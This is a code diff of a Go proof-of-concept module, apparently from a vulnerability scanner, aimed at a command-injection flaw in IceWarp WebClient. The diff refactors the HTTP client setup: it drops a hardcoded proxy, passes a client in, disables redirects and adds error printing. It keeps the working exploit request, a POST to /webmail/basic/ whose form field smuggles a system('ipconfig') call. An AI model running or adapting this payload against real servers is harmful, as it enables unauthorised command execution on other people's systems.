@@ -1,14 +1,11 @@
 package POC
 
 import (
-	"crypto/tls"
+	"fmt"
 	"io/ioutil"
 	"math/rand"
-	"net"
 	"net/http"
-	"net/url"
 	"strings"
-	"time"
 )
 
 //随机UA头
@@ -34,34 +31,12 @@ func rndua() string {
 type IceWarp_WebClient_basic_command_injection struct {
 }
 
-func (a IceWarp_WebClient_basic_command_injection) Attack(target string) Returnre {
+func (a IceWarp_WebClient_basic_command_injection) Attack(target string, client *http.Client) Returnre {
 	var temp Returnre
 	temp.Flag = false
 	temp.Target = target
 	temp.Bannner = "IceWarp WebClient"
 	temp.Pocname = "IceWarp_WebClient_basic_command_injection"
-	proxy, _ := url.Parse("http://127.0.0.1:8080")
-	tr := &http.Transport{
-		//关闭证书验证
-		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-		//设置超时
-		Dial: (&net.Dialer{
-			Timeout:   2 * time.Second,
-			KeepAlive: 30 * time.Second,
-		}).Dial,
-		TLSHandshakeTimeout:   5 * time.Second,
-		ResponseHeaderTimeout: 2 * time.Second,
-		ExpectContinueTimeout: 2 * time.Second,
-		//设置代理
-		Proxy: http.ProxyURL(proxy),
-	}
-	client := &http.Client{
-		//禁止重定向
-		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			return http.ErrUseLastResponse
-		},
-		Transport: tr,
-	}
 	pocurl := "/webmail/basic/"
 	data := "_dlg[captcha][target]=system(\\'ipconfig\\')\\"
 
@@ -75,10 +50,14 @@ func (a IceWarp_WebClient_basic_command_injection) Attack(target string) Returnr
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
 	req.Header.Add("Accept-Encoding", "gzip, deflate")
+	//设置不需要302
+	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+		return http.ErrUseLastResponse
+	}
 	resp, err := client.Do(req)
 
 	if err != nil {
-		//fmt.Println("[-]: ", err)
+		fmt.Println("[-]POC err: ", err)
 		return temp
 	}
 	defer resp.Body.Close()
